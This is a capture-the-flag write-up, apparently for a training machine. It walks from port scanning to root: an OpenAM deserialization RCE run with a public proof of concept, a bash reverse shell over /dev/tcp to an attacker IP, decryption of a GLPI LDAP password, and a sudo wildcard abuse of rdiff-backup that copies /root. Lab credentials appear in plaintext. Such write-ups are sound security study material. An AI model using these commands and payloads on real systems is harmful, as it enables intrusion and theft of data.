
Given the IP address we start the journey of pawning this box

## Enumeration

We start with port enumeration using nmap 
- First we start by uncovering the open ports and then we uncover the services running on them
```bash
nmap -Pn -sS 10.129.142.61

Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
4444/tcp  open  krb524
50389/tcp open  unknown
```
- We got 5 open ports now let's see what services are running on them
```bash
nmap -sV -sC -p22,80,443,4444,50389 10.129.142.61
```
- port 22 - open for ssh
- port 80 - for HTTP redirects to `https://management.htb` 
- port 443 - for HTTPS
- port 4444 and 50389 - open for LDAP 

Since we got a redirect on `management.htb` we have to add it to the `/etc/hosts` files: `10.129.142.61 management.htb`

## Exploiting the Webapp

First thing usually for this easy machines is to check the website so we start burp suite and its integrated browser and search for `https://management.htb`
![](Images/Pasted%20image%2020261104085918.png)
- Nothing special about the website itself but we can see that in the top-right corner we got a button named `Client Login` which may redirect us to a login portal

Clicking the button it redirects me to another domain: `sso.management.htb` which holds an installation of `OpenAM Community Edition` and It shows me a login form
- I also added this subdomain to the `/etc/hosts` file
![](Images/Pasted%20image%2020261104090238.png)

At this stage I look in burp suite to see if any request/response to the webapp can give me any useful information:

Looking at several requests regarding the templates (`/openam/XUI/templates/...`) I can see at the end of them a GET parameter `v` and a series of numbers `16.0.5` that might represent the version of `OpenAM` 
![](Images/Pasted%20image%2020261104090602.png)

Now that we found the version I can continue with a search on Google for a known CVE regarding `OpenAM 16.0.5`

After a quick search I found the CVE I need: [CVE-2026-33439](https://www.cve.org/CVERecord?id=CVE-2026-33439) 
- It is a vulnerability that targets all `OpenAM` versions prior to `16.0.6` which fits our case
- The versions are vulnerable to pre-authentication RCE via unsafe Java deserialization of `jato.clientSession` HTTP parameter
- On [this page](https://github.com/OpenIdentityPlatform/OpenAM/security/advisories/GHSA-2cqq-rpvq-g5qj) we can find additional information about the CVE, where the whole process that leads to this vulnerability is explained

Searching for a working PoC I stumble across this github repo which holds an exploit and explains how to use it: https://github.com/Ibonok/CVE-2026-33439-PoC

Now I have to try the exploit to run code on the target and deploy a reverse shell
1. First step is to clone the git repo: `git clone https://github.com/Ibonok/CVE-2026-33439-PoC`
2. Next as the repo states I have to run `./build.sh`
![](Images/Pasted%20image%2020261104091702.png)
3. I tried to run the exploit but I encountered some problems with the payload, but I found a quick fix which helped me run it:
```bash
PAYLOAD=$(java -jar CVE-2026-33439-Echo.jar generate --raw | base64 | tr -d '\n' | tr '+/' '-_' | tr -d '=')
```
- Now to run the `curl` command:
```bash
curl -sk -H 'cmd: <command>' "https://sso.management.htb/openam/ui/PWResetUserValidation?jato.clientSession=${PAYLOAD}"
```

First I try with the `id` command to see if I can successfully run commands on the target:
![](Images/Pasted%20image%2020261104092358.png)
- As we can see it worked so now let's get a reverse shell

First I open a listener with ncat on port 4444: `nc -lvnp 4444` and then I am going to use the following command to get the reverse shell:
```bash
curl -sk -H "cmd: /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.123/4444 0>&1'" "https://sso.management.htb/openam/ui/PWResetUserValidation?jato.clientSession=${PAYLOAD}"
```
- The exploit worked and landed me a reverse shell on the target as the `openam` user
![](Images/Pasted%20image%2020261104092726.png)

## Lateral Movement

First thing is to check the next user I want to pivot to and for that I check the `/home` directory and also the `/etc/passwd`
![](Images/Pasted%20image%2020261104134827.png)
- So the next user in our process is `owen` 

Now usually the easiest and most common way to pivot to `owen` is to find a password in a database or config file and hope that `owen` reuses his passwords and is the same as the `ssh` credential

Through my search I stumbled upon an interest finding in the `/opt` folder
- The folder holds more sub directories including `openam` and others
![](Images/Pasted%20image%2020261104135310.png)
- 2 of those directories may hold valuable information like config files or databases or other files: `backup` and `glpi` 

The `backup` folder contains meaningless files and another directory which is owned by `root` and we can't access
![](Images/Pasted%20image%2020261104135552.png)

The `glpi` directory holds an open-source IT service management and asset management software written in PHP
- The software holds its config files in the `/config` directory and I decide to check the content
![](Images/Pasted%20image%2020261104135944.png)

Checking the `config_db.php` file I found a set of credentials to a database named `glpidb`  
![](Images/Pasted%20image%2020261104140125.png)
- Since there is also a password present I tried to ssh into `owen` account but with no prevail

Next I try to connect to the database as the `glpi` user with the `8rhu0L6Pw4Y7` password
```bash
mysql -u glpi -p
Password: 8rhu0L6Pw4Y7
```

There are several databases that might be of interest:
- `glpi_users` - holds all the user but only standard ones with the default passwords are present so no help there
- `glpi_configs` - holds config settings but nothing of interest there as well
- `glpi_authldaps` - holds information about the LDAP server that runs on the server alongside this GLPI software

The `glpi_authldaps` holds an encrypted password which might be exactly what I need
![](Images/Pasted%20image%2020261104141209.png)
- The password is encoded with base64 : `avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==`

Decoding the password from base64 gives me gibberish:
![](Images/Pasted%20image%2020261104141451.png)

Searching on the Internet I found that in order to decrypt the password I need the key from the `glpicrypt.key` file
![](Images/Pasted%20image%2020261104145356.png)

Now I have to construct a script to decode the key
```bash
# Step 1 - write the script 
curl -sk -H 'cmd: echo "<?php require \"/opt/glpi/vendor/autoload.php\"; \$k = new \GLPIKey(\"/opt/glpi/config\"); echo \$k->decrypt(\"avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==\");" > /tmp/dec.php' "https://sso.management.htb/openam/ui/PWResetUserValidation?jato.clientSession=${PAYLOAD}" 
# Step 2 - execute it 
curl -sk -H 'cmd: php /tmp/dec.php' "https://sso.management.htb/openam/ui/PWResetUserValidation?jato.clientSession=${PAYLOAD}"
```

After executing the script I got the password `WpczC40GhTbk`
![](Images/Pasted%20image%2020261104150545.png)

First thing is to try and see if I can SSH into `owen` account
```bash
ssh owen@management.htb
Password: WpczC40GhTbk
```

The connection was successful and I got access as `owen` and also got the user flag:
![](Images/Pasted%20image%2020261104150721.png)

## Privilege Escalation

To start the privilege escalation process I run the command `sudo -l` which points me to an executable that I can run with `root` permissions
![](Images/Pasted%20image%2020261104151734.png)
- since there is a `*` wildcard at the end of the command I can append any parameter I want after that command so there aren't many restrictions 

Checking the script inside the `/usr/bin/rdiff-backup` file we can see that it is actually just the `rdiff-backup` python tool![](Images/Pasted%20image%2020261104152549.png)

`rdiff-backup` normally works like this:
- When you back up a **remote** machine, `rdiff-backup` uses SSH to start a copy of itself on the remote in `--server` mode:
- The client and server talk to each other over `stdin/stdout` using a custom protocol. The server just exposes its local filesystem to the client
- The `--remote-schema` flag defines how the client spawns the server

Because we can run it with `sudo` permissions in server mode we just have to add `--restrict-path /` meaning the server will allow access to everything

So to get access to the entire system:
1. You run `rdiff-backup` as a normal user (client mode)
2. The client needs to spawn a server through a wrapper via `--remote-schema`
3. The wrapper spawns the root server via sudo with the extra `--restrict-path /`
4. Client and server communicate over `stdio` handing what we need

- We write the wrapper
```bash
echo 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path /' > /tmp/srv.sh
```
- Then we give it permissions:
```bash
chmod +x /tmp/srv.sh
```
- Finally we run the client to get the entirety of the `/root` folder inside `/tmp/loot`
```bash
rdiff-backup --remote-schema '/tmp/srv.sh %s' localhost::/root /tmp/loot
```
![](Images/Pasted%20image%2020261104154132.png)

Now if we check the `/tmp/loot` folder we can see that we have everything that should be found in the `/root` directory, meaning we also got the flag from the `root.txt` file
![](Images/Pasted%20image%2020261104154305.png)
